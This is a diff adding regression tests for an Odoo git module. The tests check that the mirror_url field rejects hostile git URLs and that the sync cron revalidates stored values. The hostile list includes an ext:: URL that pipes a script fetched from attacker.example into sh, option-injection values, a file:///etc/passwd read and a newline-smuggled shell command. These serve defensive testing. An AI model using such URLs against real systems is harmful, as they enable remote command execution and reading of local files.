@@ -9,7 +9,7 @@ import json
 import os
 import subprocess
 
-from odoo.exceptions import AccessError
+from odoo.exceptions import AccessError, UserError, ValidationError
 from odoo.tests import HttpCase, tagged
 
 from .common import OdooGitCommon
@@ -97,6 +97,73 @@ class TestGroupCollaborators(OdooGitCommon):
                           visibility='private')
         member.invalidate_recordset()
         self.assertTrue(repo._check_repo_access(member, 'write'))
+
+
+@tagged('regression', 'post_install', '-at_install')
+class TestMirrorUrlValidation(OdooGitCommon):
+    """`git fetch` treats some URL forms as commands, not locations.
+
+    `mirror_url` is a plain field on git.repository and ir.model.access
+    grants every employee write on that model, so it is attacker-controlled
+    input handed to git by an hourly cron running as the Odoo system user.
+    """
+
+    #: each of these makes git do something other than fetch a repository
+    HOSTILE = [
+        "ext::sh -c 'curl http://attacker.example/x.sh|sh'",  # runs a shell
+        'ext::git-upload-pack /tmp',                          # runs a helper
+        'file:///etc/passwd',                                 # reads local fs
+        '-upload-pack=/bin/sh',                               # parsed as option
+        '--exec=/bin/sh',                                     # parsed as option
+        'https://host/repo.git\next::sh -c id',               # newline smuggling
+    ]
+
+    LEGITIMATE = [
+        'https://github.com/owner/repo.git',
+        'http://internal.example/repo.git',
+        'git://git.example.com/repo',
+        'ssh://git@example.com:22/owner/repo.git',
+        'git@github.com:owner/repo.git',
+    ]
+
+    def test_hostile_mirror_urls_are_rejected(self):
+        repo = self._repo('mirror-guard')
+        for url in self.HOSTILE:
+            # each attempt gets its own savepoint: a ValidationError raised
+            # during flush leaves the cursor unusable otherwise
+            with self.assertRaises(ValidationError, msg=f'accepted {url!r}'):
+                with self.env.cr.savepoint():
+                    repo.write({'mirror_url': url})
+                    self.env.flush_all()
+            repo.invalidate_recordset()
+            self.assertFalse(repo.mirror_url, f'{url!r} was stored')
+
+    def test_legitimate_mirror_urls_are_accepted(self):
+        repo = self._repo('mirror-ok')
+        for url in self.LEGITIMATE:
+            repo.write({'mirror_url': url})
+            self.env.flush_all()
+            self.assertEqual(repo.mirror_url, url)
+
+    def test_sync_revalidates_before_running_git(self):
+        """The cron must not trust what is already in the database."""
+        repo = self._repo('mirror-sql')
+        self.env.cr.execute(
+            "UPDATE git_repository SET mirror_url = %s WHERE id = %s",
+            ("ext::sh -c 'touch /tmp/odoogit_pwned'", repo.id))
+        repo.invalidate_recordset()
+        with self.assertRaises(UserError):
+            repo._sync_mirror()
+
+    def test_cron_survives_a_poisoned_mirror(self):
+        """One bad row must not stop every other mirror from syncing."""
+        repo = self._repo('mirror-cron')
+        self.env.cr.execute(
+            "UPDATE git_repository SET mirror_url = %s, is_mirror = true, "
+            "mirror_active = true WHERE id = %s",
+            ('file:///etc/passwd', repo.id))
+        repo.invalidate_recordset()
+        self.Repo._cron_sync_mirrors()   # logs and continues, does not raise
 
 
 @tagged('regression', 'post_install', '-at_install')
